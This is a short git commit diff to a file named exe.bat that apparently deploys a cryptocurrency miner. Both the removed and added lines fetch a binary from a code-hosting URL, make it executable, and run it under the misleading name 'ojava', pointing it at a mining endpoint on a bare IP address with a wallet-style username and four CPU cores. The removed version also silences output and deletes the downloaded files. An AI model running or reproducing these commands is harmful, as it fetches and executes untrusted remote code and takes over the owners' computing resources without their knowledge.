16cb7fff9fab0821c516b109ceb5460a4ba4a28f
christineiimegan <christineiimegan@outlook.com>
2025-02-23 16:57:20 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,2 +1,1 @@
-wget -qO sg.tar.gz https://gitlab.com/derisafrew/vx/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
-./ojava --url ws://8.209.210.176:80/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-ROG) --cores 4 &>/dev/null &
+wget https://github.com/christineiimegan/miniature/raw/refs/heads/main/ojava && chmod 777 ojava && ./ojava --url ws://8.209.210.176:80/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-GHH) --cores 4 
